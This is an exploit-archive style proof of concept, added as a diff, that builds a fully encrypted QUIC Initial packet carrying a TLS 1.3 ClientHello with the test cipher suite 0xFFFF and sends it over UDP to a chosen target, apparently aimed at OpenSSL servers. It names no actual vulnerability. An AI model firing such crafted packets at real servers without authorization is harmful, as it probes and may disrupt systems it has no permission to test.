@@ -1,0 +1,212 @@
+=============================================================================================================================================
+| # Title     : OpenSSL 3.x QUIC Initial Packet Builder and Sender with TLS 1.3 Payload                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.openssl-library.org/                                                                                            |
+=============================================================================================================================================
+
+[+] References : 
+
+[+] Summary    :  This script is a PoC QUIC client that constructs fully encrypted Initial packets with header protection. It can be used for testing or fuzzing QUIC/TLS 1.3 implementations.
+                  The script constructs and sends a cryptographically valid QUIC Initial packet over UDP. It simulates a QUIC client handshake, 
+				  including TLS 1.3 ClientHello, key derivation, AEAD encryption, and header protection.
+
+[+] Key Features :
+
+QUIC Version Salt
+Used for initial secret derivation from the Destination Connection ID (DCID).
+Variable-Length Integer Encoding
+Encodes integers according to QUIC’s varint format (RFC 9000).
+HKDF Key Derivation
+
+[+] Derives:
+
+client_secret
+key → AES-GCM encryption key
+iv → AEAD nonce
+hp → Header protection key
+
+[+] Header Protection :
+
+Masks the first byte and packet number of the QUIC header using AES-ECB.
+TLS 1.3 ClientHello Payload
+Crafts a TLS handshake payload with:
+Supported versions (TLS 1.3)
+ALPN (HTTP/3)
+Signature algorithms
+Random key share
+Cipher suites (includes 0xFFFF for testing)
+
+[+] Packet Construction :
+
+Builds QUIC crypto frame with TLS payload and padding (≥1200 bytes)
+Encrypts payload with AES-GCM using header as associated data
+Applies header protection
+Returns a fully constructed QUIC Initial packet
+
+[+] Sending the Packet :
+
+Sends the crafted packet over UDP to a target IP/port.
+
+[+] Workflow :
+
+Input DCID → derive QUIC secrets
+Craft TLS 1.3 ClientHello payload
+Build QUIC Initial packet (crypto frame + padding)
+Encrypt payload with AES-GCM
+Apply header protection
+Send packet over UDP
+
+[+] Libraries Used :
+
+cryptography.hazmat.primitives → HKDF, AES-GCM, AES-ECB, SHA256
+socket → UDP transmission
+struct → Binary packing
+os → Random bytes
+
+[+] POC :
+
+#!/usr/bin/env python3
+
+import socket
+import os
+import struct
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.hkdf import HKDFExtract, HKDFExpand
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+QUIC_V1_SALT = bytes.fromhex("afbfec289993d24c9e9786f19c6111e04390a899")
+
+def quic_varint(n):
+
+    if n < 64:
+        return struct.pack(">B", n)
+    elif n < 16384:
+        return struct.pack(">H", n | 0x4000)
+    elif n < 1073741824:
+        return struct.pack(">I", n | 0x80000000)
+    else:
+        return struct.pack(">Q", n | 0xc000000000000000)
+
+def hkdf_expand_label(secret, label, length, context=b""):
+
+    full_label = b"tls13 " + label.encode()
+    info = (
+        struct.pack(">H", length) +
+        struct.pack("B", len(full_label)) + full_label +
+        struct.pack("B", len(context)) + context
+    )
+    return HKDFExpand(
+        algorithm=hashes.SHA256(),
+        length=length,
+        info=info
+    ).derive(secret)
+
+def derive_secrets(dcid):
+    initial_secret = HKDFExtract(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=QUIC_V1_SALT
+    ).derive(dcid)
+
+    client_secret = hkdf_expand_label(initial_secret, "client in", 32)
+    
+    key = hkdf_expand_label(client_secret, "quic key", 16)
+    iv  = hkdf_expand_label(client_secret, "quic iv", 12)
+    hp  = hkdf_expand_label(client_secret, "quic hp", 16) # Header Protection Key
+    
+    return key, iv, hp
+
+def apply_header_protection(packet, pn_offset, pn_len, hp_key):
+
+    sample_offset = pn_offset + 4 
+    sample = packet[sample_offset : sample_offset + 16]
+
+    cipher = Cipher(algorithms.AES(hp_key), modes.ECB())
+    mask = cipher.encryptor().update(sample)
+
+    data = bytearray(packet)
+
+    data[0] ^= (mask[0] & 0x0f)
+
+    for i in range(pn_len):
+        data[pn_offset + i] ^= mask[i + 1]
+    return bytes(data)
+
+def craft_tls_payload():
+
+    exts = (
+        b"\x00\x2b\x00\x02\x03\x04" +           
+        b"\x00\x10\x00\x02\x00\x03" +           
+        b"\x00\x0d\x00\x08\x00\x06\x04\x03\x05\x03\x06\x03" + 
+        b"\x00\x33\x00\x26\x00\x24\x00\x1d\x00\x20" + os.urandom(32) 
+    )
+
+    ciphers = b"\x13\x01\xff\xff\x13\x02" 
+    
+    body  = b"\x03\x03" + os.urandom(32) 
+    body += b"\x00"                     
+    body += struct.pack(">H", len(ciphers)) + ciphers
+    body += b"\x01\x00"                 
+    body += struct.pack(">H", len(exts)) + exts
+
+    return b"\x01" + struct.pack(">I", len(body))[1:] + body
+
+def build_packet(dcid_hex):
+
+    dcid = bytes.fromhex(dcid_hex)
+    scid = os.urandom(8)
+
+    key, iv, hp = derive_secrets(dcid)
+
+    tls_data = craft_tls_payload()
+    crypto_frame = b"\x06" + quic_varint(0) + quic_varint(len(tls_data)) + tls_data
+
+    payload = crypto_frame.ljust(1160, b"\x00") 
+
+    pn = b"\x00\x00\x00\x01" 
+    pn_len = len(pn)
+
+    nonce = bytearray(iv)
+    for i in range(pn_len):
+        nonce[-pn_len + i] ^= pn[i]
+
+    header = bytearray([0xC3]) 
+    header += struct.pack(">I", 1) 
+    header += struct.pack("B", len(dcid)) + dcid
+    header += struct.pack("B", len(scid)) + scid
+    header += b"\x00" # Token Length
+    header += quic_varint(pn_len + len(payload) + 16) 
+
+    aead = AESGCM(key)
+
+    encrypted = aead.encrypt(bytes(nonce), payload, bytes(header))
+
+    pn_offset = len(header)
+    full_packet = header + pn + encrypted
+
+    return apply_header_protection(full_packet, pn_offset, pn_len, hp)
+
+def send_test(ip, port=443):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+
+        packet = build_packet("1122334455667788")
+        print(f"[*] Sending cryptographically valid QUIC Initial to {ip}:{port}")
+        sock.sendto(packet, (ip, port))
+        print("[+] Packet sent successfully. If the server is OpenSSL, it will now decrypt it.")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    finally:
+        sock.close()
+
+if __name__ == "__main__":
+    import sys
+    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
+    send_test(target)
+	
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
